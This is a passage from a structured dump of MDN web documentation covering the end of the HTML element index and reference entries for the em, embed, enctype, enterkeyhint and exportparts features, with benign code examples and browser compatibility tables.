a progress bar.                                                                                                                                                                                                                                                    |\n| [`<select>`](element/select)     | Represents a control that provides a menu of options.                                                                                                                                                                                                                                                                                                      |\n| [`<textarea>`](element/textarea) | Represents a multi-line plain-text editing control, useful when you want to allow users to enter a sizeable amount of free-form text, for example, a comment on a review or feedback form.                                                                                                                                                                 |\n\n## Interactive elements\n\nHTML offers a selection of elements that help to create interactive user interface objects.\n\n| Element                        | Description                                                                                                                                                                                              |\n|--------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<details>`](element/details) | Creates a disclosure widget in which information is visible only when the widget is toggled into an \"open\" state. A summary or label must be provided using the [`<summary>`](element/summary) element.  |\n| [`<dialog>`](element/dialog)   | Represents a dialog box or other interactive component, such as a dismissible alert, inspector, or subwindow.                                                                                            |\n| [`<summary>`](element/summary) | Specifies a summary, caption, or legend for a details element's disclosure box. Clicking the `<summary>` element toggles the state of the parent [`<details>`](element/details) element open and closed. |\n\n## Web Components\n\nWeb Components is an HTML-related technology that makes it possible to, essentially, create and use custom elements as if it were regular HTML. In addition, you can create custom versions of standard HTML elements.\n\n| Element                          | Description                                                                                                                                                                                                                                                                      |\n|----------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<slot>`](element/slot)         | Part of the [Web Components](https://developer.mozilla.org/en-US/docs/Web/API/Web_components) technology suite, this element is a placeholder inside a web component that you can fill with your own markup, which lets you create separate DOM trees and present them together. |\n| [`<template>`](element/template) | A mechanism for holding HTML that is not to be rendered immediately when a page is loaded but may be instantiated subsequently during runtime using JavaScript.                                                                                                                  |\n\n## Obsolete and deprecated elements\n\n**Warning:** These are old HTML elements that are deprecated and should not be used. **You should never use them in new projects, and you should replace them in old projects as soon as you can.** They are listed here for completeness only.\n\n| Element                            | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |\n|------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<acronym>`](element/acronym)     | Allows authors to clearly indicate a sequence of characters that compose an acronym or abbreviation for a word.                                                                                                                                                                                                                                                                                                                                                                                                   |\n| [`<big>`](element/big)             | Renders the enclosed text at a font size one level larger than the surrounding text (`medium` becomes `large`, for example). The size is capped at the browser's maximum permitted font size.                                                                                                                                                                                                                                                                                                                     |\n| [`<center>`](element/center)       | Displays its block-level or inline contents centered horizontally within its containing element.                                                                                                                                                                                                                                                                                                                                                                                                                  |\n| `<content>`                        | An obsolete part of the [Web Components](https://developer.mozilla.org/en-US/docs/Web/API/Web_components) suite of technologies—was used inside of [Shadow DOM](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM) as an insertion point, and wasn't meant to be used in ordinary HTML. It has now been replaced by the [`<slot>`](element/slot) element, which creates a point in the DOM at which a shadow DOM can be inserted. Consider using [`<slot>`](element/slot) instead. |\n| [`<dir>`](element/dir)             | Container for a directory of files and/or folders, potentially with styles and icons applied by the user agent. Do not use this obsolete element; instead, you should use the [`<ul>`](element/ul) element for lists, including lists of files.                                                                                                                                                                                                                                                                   |\n| [`<font>`](element/font)           | Defines the font size, color and face for its content.                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| [`<frame>`](element/frame)         | Defines a particular area in which another HTML document can be displayed. A frame should be used within a [`<frameset>`](element/frameset).                                                                                                                                                                                                                                                                                                                                                                      |\n| [`<frameset>`](element/frameset)   | Used to contain [`<frame>`](element/frame) elements.                                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| `<image>`                          | An ancient and poorly supported precursor to the [`<img>`](element/img) element. It should not be used.                                                                                                                                                                                                                                                                                                                                                                                                           |\n| [`<marquee>`](element/marquee)     | Used to insert a scrolling area of text. You can control what happens when the text reaches the edges of its content area using its attributes.                                                                                                                                                                                                                                                                                                                                                                   |\n| `<menuitem>`                       | Represents a command that a user is able to invoke through a popup menu. This includes context menus, as well as menus that might be attached to a menu button.                                                                                                                                                                                                                                                                                                                                                   |\n| [`<nobr>`](element/nobr)           | Prevents the text it contains from automatically wrapping across multiple lines, potentially resulting in the user having to scroll horizontally to see the entire width of the text.                                                                                                                                                                                                                                                                                                                             |\n| [`<noembed>`](element/noembed)     | An obsolete, non-standard way to provide alternative, or \"fallback\", content for browsers that do not support the embed element or do not support the type of [embedded content](content_categories#embedded_content) an author wishes to use. This element was deprecated in HTML 4.01 and above in favor of placing fallback content between the opening and closing tags of an [`<object>`](element/object) element.                                                                                           |\n| [`<noframes>`](element/noframes)   | Provides content to be presented in browsers that don't support (or have disabled support for) the [`<frame>`](element/frame) element. Although most commonly-used browsers support frames, there are exceptions, including certain special-use browsers including some mobile browsers, as well as text-mode browsers.                                                                                                                                                                                           |\n| [`<param>`](element/param)         | Defines parameters for an [`<object>`](element/object) element.                                                                                                                                                                                                                                                                                                                                                                                                                                                   |\n| [`<plaintext>`](element/plaintext) | Renders everything following the start tag as raw text, ignoring any following HTML. There is no closing tag, since everything after it is considered raw text.                                                                                                                                                                                                                                                                                                                                                   |\n| [`<rb>`](element/rb)               | Used to delimit the base text component of a ruby annotation, i.e. the text that is being annotated. One `<rb>` element should wrap each separate atomic segment of the base text.                                                                                                                                                                                                                                                                                                                                |\n| [`<rtc>`](element/rtc)             | Embraces semantic annotations of characters presented in a ruby of [`<rb>`](element/rb) elements used inside of [`<ruby>`](element/ruby) element. [`<rb>`](element/rb) elements can have both pronunciation ([`<rt>`](element/rt)) and semantic ([`<rtc>`](element/rtc)) annotations.                                                                                                                                                                                                                             |\n| `<shadow>`                         | An obsolete part of the [Web Components](https://developer.mozilla.org/en-US/docs/Web/API/Web_components) technology suite that was intended to be used as a shadow DOM insertion point. You might have used it if you have created multiple shadow roots under a shadow host. Consider using [`<slot>`](element/slot) instead.                                                                                                                                                                                   |\n| [`<strike>`](element/strike)       | Places a strikethrough (horizontal line) over text.                                                                                                                                                                                                                                                                                                                                                                                                                                                               |\n| [`<tt>`](element/tt)               | Creates inline text which is presented using the user agent default monospace font face. This element was created for the purpose of rendering text as it would be displayed on a fixed-width display such as a teletype, text-only screen, or line printer.                                                                                                                                                                                                                                                      |\n| [`<xmp>`](element/xmp)             | Renders text between the start and end tags without interpreting the HTML in between and using a monospaced font. The HTML2 specification recommended that it should be rendered wide enough to allow 80 characters per line.                                                                                                                                                                                                                                                                                     |\n\n## See also\n\n- [`Element`](https://developer.mozilla.org/en-US/docs/Web/API/Element) interface\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element](https://developer.mozilla.org/en-US/docs/Web/HTML/Element)"
- name: em
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<em\\>: The Emphasis element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fem&level=high)\n\nThe `<em>` [HTML](../index) element marks text that has stress emphasis. The `<em>` element can be nested, with each level of nesting indicating a greater degree of emphasis.\n\n## Try it\n\n#### HTML Demo: \\<em\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Get out of bed <em>now</em>!</p>\n\n    <p>We <em>had</em> to do something about it.</p>\n\n    <p>This is <em>not</em> a drill!</p>\n\n    /* stylelint-disable-next-line block-no-empty */\n    em {\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nThe `<em>` element is for words that have a stressed emphasis compared to surrounding text, which is often limited to a word or words of a sentence and affects the meaning of the sentence itself.\n\nTypically this element is displayed in italic type. However, it should not be used to apply italic styling; use the CSS [`font-style`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-style) property for that purpose. Use the [`<cite>`](cite) element to mark the title of a work (book, play, song, etc.). Use the [`<i>`](i) element to mark text that is in an alternate tone or mood, which covers many common situations for italics such as scientific names or words in other languages. Use the [`<strong>`](strong) element to mark text that has greater importance than surrounding text.\n\n### \\<i\\> vs. \\<em\\>\n\nSome developers may be confused by how multiple elements seemingly produce similar visual results. `<em>` and `<i>` are a common example, since they both italicize text. What's the difference? Which should you use?\n\nBy default, the visual result is the same. However, the semantic meaning is different. The `<em>` element represents stress emphasis of its contents, while the `<i>` element represents text that is set off from the normal prose, such as a foreign word, fictional character thoughts, or when the text refers to the definition of a word instead of representing its semantic meaning. (The title of a work, such as the name of a book or movie, should use `<cite>`.)\n\nThis means the right one to use depends on the situation. Neither is for purely decorative purposes, that's what CSS styling is for.\n\nExamples for `<em>` could be:\n\nhtml\n\n```\n<p>Just <em>do</em> it already!</p>\n<p>We <em>had</em> to do something about it.</p>\n```\n\nA person or software reading the text would pronounce the words in italics with an emphasis, using verbal stress.\n\nExamples for `<i>` could be:\n\nhtml\n\n```\n<p>The word <i>the</i> is an article.</p>\n<p>The <i>Queen Mary</i> sailed last night.</p>\n```\n\nHere, there is no added emphasis or importance on the word \"Queen Mary\". It is merely indicated that the object in question is not a queen named Mary but a ship named \"Queen Mary\".\n\n## Examples\n\nIn this example, the `<em>` element is used to highlight an implicit or explicit contrast between two ingredient lists:\n\nhtml\n\n```\n<p>\n  Ice cream is made with milk, sweetener, and cream. Frozen custard, on the\n  other hand, is made of milk, cream, sweetener, and <em>egg yolks</em>.\n</p>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                 |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content.                                                                                                                               |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                     |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                           |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                                                                                                                            |\n| Implicit ARIA role                          | [`emphasis`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles#structural_roles_with_html_equivalents)                                                                                                                     |\n| Permitted ARIA roles                        | Any                                                                                                                                                                                                                                                             |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) Up to Gecko 1.9.2 (Firefox 4) inclusive, Firefox implements the [`HTMLSpanElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSpanElement) interface for this element. |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|      | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|      | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `em` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<i>`](i)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/em](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/em)"
- name: embed
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<embed\\>: The Embed External Content element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since January 2020.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fembed&level=high)\n\nThe `<embed>` [HTML](../index) element embeds external content at the specified point in the document. This content is provided by an external application or other source of interactive content such as a browser plug-in.\n\n## Try it\n\n#### HTML Demo: \\<embed\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <embed type=\"video/webm\" src=\"/media/cc0-videos/flower.mp4\" width=\"250\" height=\"200\" />\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n**Note:** This topic documents only the element that is defined as part of the [HTML Living Standard](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element). It does not address earlier, non-standardized implementation of the element.\n\nKeep in mind that most modern browsers have deprecated and removed support for browser plug-ins, so relying upon `<embed>` is generally not wise if you want your site to be operable on the average user's browser.\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n[`height`](#height)  \nThe displayed height of the resource, in [CSS pixels](https://drafts.csswg.org/css-values/#px). This must be an absolute value; percentages are *not* allowed.\n\n[`src`](#src)  \nThe URL of the resource being embedded.\n\n[`type`](#type)  \nThe [MIME type](https://developer.mozilla.org/en-US/docs/Glossary/MIME_type) to use to select the plug-in to instantiate.\n\n[`width`](#width)  \nThe displayed width of the resource, in [CSS pixels](https://drafts.csswg.org/css-values/#px). This must be an absolute value; percentages are *not* allowed.\n\n## Usage notes\n\nYou can use the [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position) property to adjust the positioning of the embedded object within the element's frame.\n\n**Note:** The [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit) property has no effect on `<embed>` elements.\n\n## Accessibility\n\nUse the [`title` attribute](../global_attributes/title) on an `embed` element to label its content so that people navigating with assistive technology such as a screen reader can understand what it contains. The title's value should concisely describe the embedded content. Without a title, they may not be able to determine what its embedded content is. This context shift can be confusing and time-consuming, especially if the `embed` element contains interactive content like video or audio.\n\n## Examples\n\nhtml\n\n```\n<embed\n  type=\"video/quicktime\"\n  src=\"movie.mov\"\n  width=\"640\"\n  height=\"480\"\n  title=\"Title of my video\" />\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), embedded content, interactive content, [palpable content](../content_categories#palpable_content).                                                                                                                                                                                                                                                                                        |\n| Permitted content                           | None; it is a [void element](https://developer.mozilla.org/en-US/docs/Glossary/Void_element).                                                                                                                                                                                                                                                                                                                                                                                                             |\n| Tag omission                                | Must have a start tag and must not have an end tag.                                                                                                                                                                                                                                                                                                                                                                                                                                                       |\n| Permitted parents                           | Any element that accepts embedded content.                                                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                                                                                                                                                                                                                                                       |\n| Permitted ARIA roles                        | [`application`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/application_role), [`document`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/document_role), [`img`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/img_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) |\n| DOM interface                               | [`HTMLEmbedElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLEmbedElement)                                                                                                                                                                                                                                                                                                                                                                                                                   |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `embed`  | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n| `align`  | 1       | 79   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n| `height` | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n| `name`   | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n| `src`    | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n| `type`   | 1       | 79   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n| `width`  | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- Other elements that are used for embedding content of various types include [`<audio>`](audio), [`<canvas>`](canvas), [`<iframe>`](iframe), [`<img>`](img), [`<math>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/math), [`<object>`](object), [`<svg>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/svg), and [`<video>`](video).\n- Positioning and sizing the embedded content within its frame: [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position) and [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed)"
- name: enctype (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`enctype`](element/form#enctype)

    [`<form>`](element/form)

    Defines the content type of the form data when the `method` is POST.
- name: enterkeyhint (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`enterkeyhint`](global_attributes/enterkeyhint)

    [`<textarea>`](element/textarea), [`contenteditable`](global_attributes/contenteditable)

    The [`enterkeyhint`](https://html.spec.whatwg.org/multipage/interaction.html#input-modalities:-the-enterkeyhint-attribute) specifies what action label (or icon) to present for the enter key on virtual keyboards. The attribute can be used with form controls (such as the value of `textarea` elements), or in elements in an editing host (e.g., using `contenteditable` attribute).
- name: enterkeyhint (attribute)
  summary: The enterkeyhint global attribute is an enumerated attribute defining what action label (or icon) to present for the enter key on virtual keyboards
  description: "# enterkeyhint\n\nThe `enterkeyhint` [global attribute](../global_attributes) is an [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute defining what action label (or icon) to present for the enter key on virtual keyboards.\n\n## Try it\n\n#### HTML Demo: enterkeyhint\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <input enterkeyhint=\"go\" />\n\n    <p contenteditable enterkeyhint=\"go\">https://example.org</p>\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Description\n\n[Form controls](https://developer.mozilla.org/en-US/docs/Learn/Forms) (such as [`<textarea>`](../element/textarea) or [`<input>`](../element/input) elements) or elements using [`contenteditable`](contenteditable) can specify an [`inputmode`](inputmode) attribute to control what kind of virtual keyboard will be used. To further improve the user's experience, the enter key can be customized specifically by providing an `enterkeyhint` attribute indicating how the enter key should be labeled (or which icon should be shown). The enter key usually represents what the user should do next; typical actions are: sending text, inserting a new line, or searching.\n\nIf no `enterkeyhint` attribute is provided, the user agent might use contextual information from the [`inputmode`](inputmode), [`type`](../element/input#input_types), or [`pattern`](../element/input#pattern) attributes to display a suitable enter key label (or icon).\n\n### Values\n\nThe `enterkeyhint` attribute is an [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute and only accepts the following values:\n\n| Value                     | Description                                                                                        | Example label (depends on user agent and user language) |\n|---------------------------|----------------------------------------------------------------------------------------------------|---------------------------------------------------------|\n| `enterkeyhint=\"enter\"`    | Typically inserting a new line.                                                                    | ↵                                                       |\n| `enterkeyhint=\"done\"`     | Typically meaning there is nothing more to input and the input method editor (IME) will be closed. | Done                                                    |\n| `enterkeyhint=\"go\"`       | Typically meaning to take the user to the target of the text they typed.                           | Open                                                    |\n| `enterkeyhint=\"next\"`     | Typically taking the user to the next field that will accept text.                                 | Next                                                    |\n| `enterkeyhint=\"previous\"` | Typically taking the user to the previous field that will accept text.                             | Previous                                                |\n| `enterkeyhint=\"search\"`   | Typically taking the user to the results of searching for the text they have typed.                | Search                                                  |\n| `enterkeyhint=\"send\"`     | Typically delivering the text to its target.                                                       | Send                                                    |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `enterkeyhint` | 77      | 79   | 94      | 66    | 13.1   | 77             | 94                  | 57            | 13.4          | 12.0             | 77              |     |\n\n## See also\n\n- [`HTMLElement.enterKeyHint`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/enterKeyHint) property reflecting this attribute\n- [`inputmode`](inputmode) global attribute\n- [`contenteditable`](contenteditable) global attribute\n- [`type`](../element/input#input_types) and [`pattern`](../element/input#pattern) attributes on [`<input>`](../element/input) elements\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/enterkeyhint](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/enterkeyhint)"
- name: exportparts (attribute)
  summary: The exportparts global attribute allows you to select and style elements existing in nested shadow trees, by exporting their part names
  description: "# exportparts\n\nThe `exportparts` [global attribute](../global_attributes) allows you to select and style elements existing in nested [shadow trees](https://developer.mozilla.org/en-US/docs/Glossary/Shadow_tree), by exporting their `part` names.\n\nThe shadow tree is an isolated structure where identifiers, classes, and styles cannot be reached by selectors or queries belonging to a regular DOM. There are two HTML attributes that can be applied to shadow tree elements that enable targeting CSS styles from outside to shadow tree: `part` and `exportparts`.\n\nThe global [`part`](../global_attributes#part) attribute makes a shadow tree element visible to its parent DOM. A `part` name is used as the parameter of the [`::part()`](https://developer.mozilla.org/en-US/docs/Web/CSS/::part) pseudo-element. In this way, you can apply CSS styles to elements in the shadow tree from outside of it. However, the `::part()` pseudo-element is only visible to the parent DOM. This means that when a shadow tree is nested, the parts are not visible to any ancestors other than the direct parent. The `exportparts` attribute solves this limitation.\n\nThe `exportparts` attribute enables shadow tree parts to be visible outside the shadow DOM. This concept is referred to as \"exporting\". The `exportparts` attribute is placed on the element's *shadow host*, which is the element to which the *shadow tree* is attached. The value of this attribute is a comma-separated list of `part` names present in the shadow tree. These names are made available to the DOMs outside the current structure.\n\nhtml\n\n```\n<template id=\"ancestor-component\">\n  <nested-component exportparts=\"part1, part2, part5\"></nested-component>\n</template>\n```\n\nWhen exporting a `part`, you have the option to assign a different name to the part, as shown in the snippet below. The value of the `exportparts` attribute is really a comma-separated list of part-name mappings. So the `exportparts` attribute in the above code snippet is the equivalent of `exportparts=\"part1:part1, part2:part2, part5:part5`, indicating that each `part` is exported with the same name. In each mapping, the first string specifies the name of the part within the shadow tree, and the second string specifies the name with which the part will be exposed externally.\n\nhtml\n\n```\n<template id=\"ancestor-component\">\n  <nested-component\n    exportparts=\"part1:exposed1, part2:exposed2\"></nested-component>\n</template>\n```\n\n## Examples\n\n### Basic component\n\nTo demonstrate how `exportparts` is used to enable targeting parts within nested components, we will create a component, and then nest it within another component.\n\n#### HTML\n\nFirst, let's create a card component that we will then wrap with another component. We also use the new element we created, populating the slots with plain text as content.\n\nhtml\n\n```\n<template id=\"card-component-template\">\n  <style>\n    :host {\n      display: block;\n    }\n  </style>\n  <div class=\"base\" part=\"base\">\n    <div part=\"header\"><slot name=\"header_slot\"></slot></div>\n    <div part=\"body\"><slot name=\"body_slot\"></slot></div>\n    <div part=\"footer\"><slot name=\"footer_slot\"></slot></div>\n  </div>\n</template>\n\n<card-component>\n  <p slot=\"header_slot\">This is the header</p>\n  <p slot=\"body_slot\">This is the body</p>\n  <p slot=\"footer_slot\">This is the footer</p>\n</card-component>\n```\n\n#### JavaScript\n\nWe use JavaScript to define our web component defined in the HTML above:\n\njs\n\n```\ncustomElements.define(\n  \"card-component\",\n  class extends HTMLElement {\n    constructor() {\n      super(); // Always call super first in constructor\n      const cardComponent = document.getElementById(\n        \"card-component-template\",\n      ).content;\n      const shadowRoot = this.attachShadow({\n        mode: \"open\",\n      });\n      shadowRoot.appendChild(cardComponent.cloneNode(true));\n    }\n  },\n);\n```\n\n#### CSS\n\nWe style parts of the `<card-component>` shadow tree using the [`::part`](https://developer.mozilla.org/en-US/docs/Web/CSS/::part) pseudo-element:\n\ncss\n\n```\n::part(body) {\n  color: red;\n  font-style: italic;\n}\n```\n\n#### Results\n\n### Nested component\n\nContinuing the above `<card-component>` example, we create a nested component by wrapping the `<card-component>` within another component; in this case, the `<card-wrapper>` component. We then export the parts from the nested component that we want to make styleable from outside the component's shadow tree with the `exportparts` attribute.\n\n#### HTML\n\nhtml\n\n```\n<template id=\"card-wrapper\">\n  <style>\n    :host {\n      display: block;\n    }\n  </style>\n  <card-component exportparts=\"base, header, body\">\n    <slot name=\"H\" slot=\"header_slot\"></slot>\n    <slot name=\"B\" slot=\"body_slot\"></slot>\n    <slot name=\"F\" slot=\"footer_slot\"></slot>\n  </card-component>\n</template>\n```\n\nWe include a `<card-wrapper>` custom element, and a `<card-component>` for comparison:\n\nhtml\n\n```\n<h2>Card wrapper</h2>\n\n<card-wrapper>\n  <p slot=\"H\">This is the header</p>\n  <p slot=\"B\">This is the body</p>\n  <p slot=\"F\">This is the footer</p>\n</card-wrapper>\n\n<h2>Card component</h2>\n\n<card-component>\n  <p slot=\"header_slot\">This is the header</p>\n  <p slot=\"body_slot\">This is the body</p>\n  <p slot=\"footer_slot\">This is the footer</p>\n</card-component>\n```\n\n#### JavaScript\n\njs\n\n```\ncustomElements.define(\n  \"card-wrapper\",\n  class extends HTMLElement {\n    constructor() {\n      super(); // Always call super first in constructor\n      const cardWrapper = document.getElementById(\"card-wrapper\").content;\n      const shadowRoot = this.attachShadow({\n        mode: \"open\",\n      });\n      shadowRoot.appendChild(cardWrapper.cloneNode(true));\n    }\n  },\n);\n```\n\n#### CSS\n\nNow, we can target parts of the `<card-component>` directly and when nested within a `<card-wrapper>` like so:\n\ncss\n\n```\nh2 {\n  background-color: #dedede;\n}\n\ncard-wrapper,\ncard-component {\n  border: 1px dashed blue;\n  width: fit-content;\n}\n\n::part(body) {\n  color: red;\n  font-style: italic;\n}\n\n::part(header),\n::part(footer) {\n  font-weight: bold;\n}\n```\n\n#### Results\n\nNote `footer` is not bold when nested, as we did not include it in `exportparts`.\n\n### Exposing mapped parts\n\nTo rename exported parts, we include a comma-separated list of mapped parts, with each mapped part including the original name and exported name separated by a colon (`:`):\n\n#### HTML\n\nWe update the prior `<card-wrapper>` custom element with the remapping syntax (omitting `body` from the exported parts list):\n\nhtml\n\n```\n<template id=\"card-wrapper\">\n  <card-component\n    exportparts=\"\n       base:card__base, \n       header:card__header, \n       footer:card__footer\n     \">\n    <span slot=\"header_slot\"><slot name=\"H\"></slot></span>\n    <span slot=\"body_slot\"><slot name=\"B\"></slot></span>\n    <span slot=\"footer_slot\"><slot name=\"F\"></slot></span>\n  </card-component>\n</template>\n```\n\n#### JavaScript\n\njs\n\n```\ncustomElements.define(\n  \"card-wrapper\",\n  class extends HTMLElement {\n    constructor() {\n      super(); // Always call super first in constructor\n      const cardWrapper = document.getElementById(\"card-wrapper\").content;\n      const shadowRoot = this.attachShadow({\n        mode: \"open\",\n      });\n      shadowRoot.appendChild(cardWrapper.cloneNode(true));\n    }\n  },\n);\n```\n\n#### CSS\n\nIn targetting the parts of the `<card-component>` from within the `<card-wrapper>`, we can only style the exported parts via their exposed part names:\n\ncss\n\n```\n/* selects the exported parts name */\n::part(card__header) {\n  font-weight: bold;\n}\n/* selects nothing: these part names were not exported */\n::part(footer),\n::part(body) {\n  font-weight: bold;\n}\n```\n\n#### Results\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|               | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|               | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `exportparts` | 73      | 79   | 72      | 60    | 13.1   | 73             | 79                  | 52            | 13.4          | 11.0             | 73              |     |\n\n## See also\n\n- [`part`](part) HTML attribute\n- [`<template>`](../element/template) and [`<slot>`](../element/slot) HTML elements\n- [`::part`](https://developer.mozilla.org/en-US/docs/Web/CSS/::part) and 